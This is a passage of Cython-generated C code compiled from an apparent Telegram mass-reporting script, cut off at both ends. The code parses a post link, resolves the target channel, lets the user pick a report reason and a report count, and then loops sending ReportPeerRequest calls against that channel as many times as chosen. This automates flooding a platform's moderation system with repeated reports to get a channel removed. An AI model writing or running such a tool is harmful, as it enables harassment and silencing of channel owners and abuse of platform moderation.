          __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
          __Pyx_XGOTREF(__pyx_t_6);
          __Pyx_XGOTREF(__pyx_t_7);
          __Pyx_XGOTREF(__pyx_t_8);
          /*try:*/ {

            
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_post_link, __pyx_n_s_replace); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 117, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 117, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 117, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
              __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
              if (likely(__pyx_t_1)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_1);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
              }
            }
            __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_kp_u__12) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_u__12);
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 117, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_parts);
            __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_parts, __pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_3);
            __pyx_t_3 = 0;

            
            __pyx_t_9 = PyObject_Length(__pyx_cur_scope->__pyx_v_parts); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 118, __pyx_L12_error)
            __pyx_t_4 = ((__pyx_t_9 != 2) != 0);
            if (!__pyx_t_4) {
            } else {
              __pyx_t_5 = __pyx_t_4;
              goto __pyx_L21_bool_binop_done;
            }
            __pyx_t_2 = __Pyx_GetItemInt(__pyx_cur_scope->__pyx_v_parts, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 118, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_isdigit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 118, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __pyx_t_2 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
              __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
              if (likely(__pyx_t_2)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                __Pyx_INCREF(__pyx_t_2);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_1, function);
              }
            }
            __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 118, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 118, __pyx_L12_error)
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_10 = ((!__pyx_t_4) != 0);
            __pyx_t_5 = __pyx_t_10;
            __pyx_L21_bool_binop_done:;
            if (__pyx_t_5) {

              
              __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 120, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_3);
              __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 120, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_1);
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

              
              __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 119, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_3);
              __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

              
              goto __pyx_L18_try_continue;

              
            }

            
            __pyx_t_3 = __Pyx_GetItemInt(__pyx_cur_scope->__pyx_v_parts, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 125, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_channel_username);
            __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_channel_username, __pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_3);
            __pyx_t_3 = 0;

            
            __pyx_t_3 = __Pyx_GetItemInt(__pyx_cur_scope->__pyx_v_parts, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 126, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_1 = __Pyx_PyNumber_Int(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 126, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_message_id);
            __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_message_id, __pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_1);
            __pyx_t_1 = 0;

            
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_client, __pyx_n_s_get_entity); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 128, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_2 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_2)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_2);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
              }
            }
            __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_cur_scope->__pyx_v_channel_username) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_cur_scope->__pyx_v_channel_username);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_r = __Pyx_Coroutine_Yield_From(__pyx_generator, __pyx_t_1);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XGOTREF(__pyx_r);
            if (likely(__pyx_r)) {
              __Pyx_XGIVEREF(__pyx_t_6);
              __pyx_cur_scope->__pyx_t_0 = __pyx_t_6;
              __Pyx_XGIVEREF(__pyx_t_7);
              __pyx_cur_scope->__pyx_t_1 = __pyx_t_7;
              __Pyx_XGIVEREF(__pyx_t_8);
              __pyx_cur_scope->__pyx_t_2 = __pyx_t_8;
              __Pyx_XGIVEREF(__pyx_r);
              __Pyx_RefNannyFinishContext();
              __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
              /* return from generator, awaiting value */
              __pyx_generator->resume_label = 1;
              return __pyx_r;
              __pyx_L23_resume_from_await:;
              __pyx_t_6 = __pyx_cur_scope->__pyx_t_0;
              __pyx_cur_scope->__pyx_t_0 = 0;
              __Pyx_XGOTREF(__pyx_t_6);
              __pyx_t_7 = __pyx_cur_scope->__pyx_t_1;
              __pyx_cur_scope->__pyx_t_1 = 0;
              __Pyx_XGOTREF(__pyx_t_7);
              __pyx_t_8 = __pyx_cur_scope->__pyx_t_2;
              __pyx_cur_scope->__pyx_t_2 = 0;
              __Pyx_XGOTREF(__pyx_t_8);
              if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 128, __pyx_L12_error)
              __pyx_t_1 = __pyx_sent_value; __Pyx_INCREF(__pyx_t_1);
            } else {
              __pyx_t_1 = NULL;
              if (__Pyx_PyGen_FetchStopIterationValue(&__pyx_t_1) < 0) __PYX_ERR(0, 128, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_1);
            }
            __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_channel);
            __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_channel, __pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_1);
            __pyx_t_1 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_colored); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 130, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 130, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 130, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

            
            __pyx_t_9 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_report_reasons); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 131, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            if (unlikely(__pyx_t_3 == Py_None)) {
              PyErr_Format(PyExc_AttributeError, "'NoneType' object has no attribute '%.30s'", "items");
              __PYX_ERR(0, 131, __pyx_L12_error)
            }
            __pyx_t_2 = __Pyx_dict_iterator(__pyx_t_3, 0, __pyx_n_s_items, (&__pyx_t_11), (&__pyx_t_12)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 131, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_1);
            __pyx_t_1 = __pyx_t_2;
            __pyx_t_2 = 0;
            while (1) {
              __pyx_t_13 = __Pyx_dict_iter_next(__pyx_t_1, __pyx_t_11, &__pyx_t_9, &__pyx_t_2, &__pyx_t_3, NULL, __pyx_t_12);
              if (unlikely(__pyx_t_13 == 0)) break;
              if (unlikely(__pyx_t_13 == -1)) __PYX_ERR(0, 131, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_GOTREF(__pyx_t_3);
              __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_number);
              __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_number, __pyx_t_2);
              __Pyx_GIVEREF(__pyx_t_2);
              __pyx_t_2 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_3))) || (PyList_CheckExact(__pyx_t_3))) {
                PyObject* sequence = __pyx_t_3;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 131, __pyx_L12_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_2 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_14 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_2 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_14 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_14);
                #else
                __pyx_t_2 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 131, __pyx_L12_error)
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_14 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 131, __pyx_L12_error)
                __Pyx_GOTREF(__pyx_t_14);
                #endif
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_15 = PyObject_GetIter(__pyx_t_3); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 131, __pyx_L12_error)
                __Pyx_GOTREF(__pyx_t_15);
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                __pyx_t_16 = Py_TYPE(__pyx_t_15)->tp_iternext;
                index = 0; __pyx_t_2 = __pyx_t_16(__pyx_t_15); if (unlikely(!__pyx_t_2)) goto __pyx_L26_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_2);
                index = 1; __pyx_t_14 = __pyx_t_16(__pyx_t_15); if (unlikely(!__pyx_t_14)) goto __pyx_L26_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_14);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_16(__pyx_t_15), 2) < 0) __PYX_ERR(0, 131, __pyx_L12_error)
                __pyx_t_16 = NULL;
                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
                goto __pyx_L27_unpacking_done;
                __pyx_L26_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
                __pyx_t_16 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 131, __pyx_L12_error)
                __pyx_L27_unpacking_done:;
              }
              __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_reason_name);
              __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_reason_name, __pyx_t_2);
              __Pyx_GIVEREF(__pyx_t_2);
              __pyx_t_2 = 0;
              __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v__);
              __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v__, __pyx_t_14);
              __Pyx_GIVEREF(__pyx_t_14);
              __pyx_t_14 = 0;

              
              __pyx_t_3 = PyTuple_New(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 132, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_3);
              __pyx_t_17 = 0;
              __pyx_t_18 = 127;
              __pyx_t_14 = __Pyx_PyObject_FormatSimple(__pyx_cur_scope->__pyx_v_number, __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 132, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_14);
              __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_18;
              __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
              __Pyx_GIVEREF(__pyx_t_14);
              PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_14);
              __pyx_t_14 = 0;
              __Pyx_INCREF(__pyx_kp_u__15);
              __pyx_t_17 += 2;
              __Pyx_GIVEREF(__pyx_kp_u__15);
              PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_kp_u__15);
              __pyx_t_14 = __Pyx_PyObject_FormatSimple(__pyx_cur_scope->__pyx_v_reason_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 132, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_14);
              __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_18;
              __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
              __Pyx_GIVEREF(__pyx_t_14);
              PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_t_14);
              __pyx_t_14 = 0;
              __pyx_t_14 = __Pyx_PyUnicode_Join(__pyx_t_3, 3, __pyx_t_17, __pyx_t_18); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 132, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
              __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_14); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 132, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_3);
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

            
            __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 133, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_get_valid_input); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 135, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);

            
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 136, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__16, NULL); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 136, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

            
            __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 135, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_14);
            __pyx_t_14 = 0;

            
            __pyx_t_14 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 139, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_report_reasons); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 139, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_15);
            __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_keys); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 139, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_19);
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            __pyx_t_15 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_19))) {
              __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_19);
              if (likely(__pyx_t_15)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
                __Pyx_INCREF(__pyx_t_15);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_19, function);
              }
            }
            __pyx_t_2 = (__pyx_t_15) ? __Pyx_PyObject_CallOneArg(__pyx_t_19, __pyx_t_15) : __Pyx_PyObject_CallNoArg(__pyx_t_19);
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 139, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
            if (PyDict_SetItem(__pyx_t_14, __pyx_n_s_valid_options, __pyx_t_2) < 0) __PYX_ERR(0, 139, __pyx_L12_error)
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

            
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, __pyx_t_14); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 135, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_reason_choice);
            __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_reason_choice, __pyx_t_2);
            __Pyx_GIVEREF(__pyx_t_2);
            __pyx_t_2 = 0;

            
            __pyx_t_5 = (__Pyx_PyUnicode_Equals(__pyx_cur_scope->__pyx_v_reason_choice, __pyx_n_u_home, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 140, __pyx_L12_error)
            if (__pyx_t_5) {

              
              goto __pyx_L17_try_break;

              
            }

            
            __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 143, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_get_valid_integer_input); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 145, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_14);

            
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 146, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 146, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
              __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_14);
              if (likely(__pyx_t_3)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
                __Pyx_INCREF(__pyx_t_3);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_14, function);
              }
            }
            __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_14, __pyx_t_3, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_t_1);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 145, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_num_reports);
            __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_num_reports, __pyx_t_2);
            __Pyx_GIVEREF(__pyx_t_2);
            __pyx_t_2 = 0;

            
            __pyx_t_5 = (__Pyx_PyUnicode_Equals(__pyx_cur_scope->__pyx_v_num_reports, __pyx_n_u_home, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 147, __pyx_L12_error)
            if (__pyx_t_5) {

              
              goto __pyx_L17_try_break;

              
            }

            
            __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 150, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

            
            __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_cur_scope->__pyx_v_num_reports); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 152, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_2);
            if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
              __pyx_t_14 = __pyx_t_2; __Pyx_INCREF(__pyx_t_14); __pyx_t_11 = 0;
              __pyx_t_20 = NULL;
            } else {
              __pyx_t_11 = -1; __pyx_t_14 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 152, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_14);
              __pyx_t_20 = Py_TYPE(__pyx_t_14)->tp_iternext; if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 152, __pyx_L12_error)
            }
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            for (;;) {
              if (likely(!__pyx_t_20)) {
                if (likely(PyList_CheckExact(__pyx_t_14))) {
                  if (__pyx_t_11 >= PyList_GET_SIZE(__pyx_t_14)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_2 = PyList_GET_ITEM(__pyx_t_14, __pyx_t_11); __Pyx_INCREF(__pyx_t_2); __pyx_t_11++; if (unlikely(0 < 0)) __PYX_ERR(0, 152, __pyx_L12_error)
                  #else
                  __pyx_t_2 = PySequence_ITEM(__pyx_t_14, __pyx_t_11); __pyx_t_11++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 152, __pyx_L12_error)
                  __Pyx_GOTREF(__pyx_t_2);
                  #endif
                } else {
                  if (__pyx_t_11 >= PyTuple_GET_SIZE(__pyx_t_14)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_14, __pyx_t_11); __Pyx_INCREF(__pyx_t_2); __pyx_t_11++; if (unlikely(0 < 0)) __PYX_ERR(0, 152, __pyx_L12_error)
                  #else
                  __pyx_t_2 = PySequence_ITEM(__pyx_t_14, __pyx_t_11); __pyx_t_11++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 152, __pyx_L12_error)
                  __Pyx_GOTREF(__pyx_t_2);
                  #endif
                }
              } else {
                __pyx_t_2 = __pyx_t_20(__pyx_t_14);
                if (unlikely(!__pyx_t_2)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 152, __pyx_L12_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_2);
              }
              __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
              __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_2);
              __Pyx_GIVEREF(__pyx_t_2);
              __pyx_t_2 = 0;

              
              __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ReportPeerRequest); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 153, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_1);

              
              __pyx_t_3 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 154, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_3);
              if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_peer, __pyx_cur_scope->__pyx_v_channel) < 0) __PYX_ERR(0, 154, __pyx_L12_error)

              
              __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_report_reasons); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 155, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_19);
              __pyx_t_15 = __Pyx_PyObject_GetItem(__pyx_t_19, __pyx_cur_scope->__pyx_v_reason_choice); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 155, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_15);
              __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
              __pyx_t_19 = __Pyx_GetItemInt(__pyx_t_15, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 155, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_19);
